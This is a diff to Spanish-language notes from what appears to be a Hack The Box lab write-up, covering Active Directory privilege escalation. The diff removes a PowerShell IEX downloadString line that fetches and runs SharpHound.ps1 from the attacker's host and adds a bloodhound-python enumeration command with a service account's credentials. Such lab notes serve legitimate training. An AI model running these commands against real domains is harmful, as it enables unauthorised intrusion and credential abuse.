@@ -150,10 +150,12 @@ Obteniendo toda la información del dominio, si ahora nos montamos un servidor c
 
 # Escalada de Privilegios
 Vamos a usar [[BLOODHOUND]] para enumerar las vías potenciales de escalada de privilegios
-Obtendremos la información con la herramienta [[SHARPHOUND]]
-Nos compartiremos la `.ps1` levantando un servidor con Python y en la maquina victima usaremos
+Obtendremos la información con la herramienta [[BLOODHOUND-PYTHON]]
 ```shell
-IEX(New-object Net.webClient).downloadString('http://10.10.14.19/SharpHound.ps1')
+bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.129.95.210 -d htb.local -c all --zip
 ```
+
+Nos generara un zip que subiremos a [[BLOODHOUND]]
+
 
 
